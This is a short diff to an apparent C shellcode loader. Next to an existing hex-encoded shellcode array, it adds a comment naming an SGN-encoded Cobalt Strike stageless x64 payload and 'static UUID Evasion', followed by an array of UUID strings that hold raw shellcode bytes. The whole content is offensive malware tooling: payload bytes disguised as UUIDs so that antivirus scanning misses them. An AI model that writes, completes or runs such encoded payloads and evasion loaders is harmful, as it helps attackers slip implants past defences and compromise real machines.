@@ -23,3 +23,17 @@ char shellcode[271] =
 "\xf7\x53\x17\xeb\x01\xb6\xd9\xe4\xc1\x43\x1b\x4f\x57\x0f\x47\xd2"
 "\x38\xd3\x80\xeb\x0e\x5f\x81\x73\x1f\x28\x14\x08\xa0\x53\xc3";
 
+// SGN(cobalt-stageless-x64) -> ShellcodetoUUID.py
+// For future static UUID Evasion - split and join parts of UUID with '-' as separator
+
+const char* uuids[] =
+{
+    "6850c031-6163-636c-5459-504092741551",
+    "2f728b64-768b-8b0c-760c-ad8b308b7e18",
+    "1aeb50b2-60b2-2948-d465-488b32488b76",
+    "768b4818-4810-48ad-8b30-488b7e300357",
+    "175c8b3c-8b28-1f74-2048-01fe8b541f24",
+    "172cb70f-528d-ad02-813c-0757696e4575",
+    "1f748bef-481c-fe01-8b34-ae4801f799ff",
+    "000000d7-0000-0000-0000-000000000000",
+};
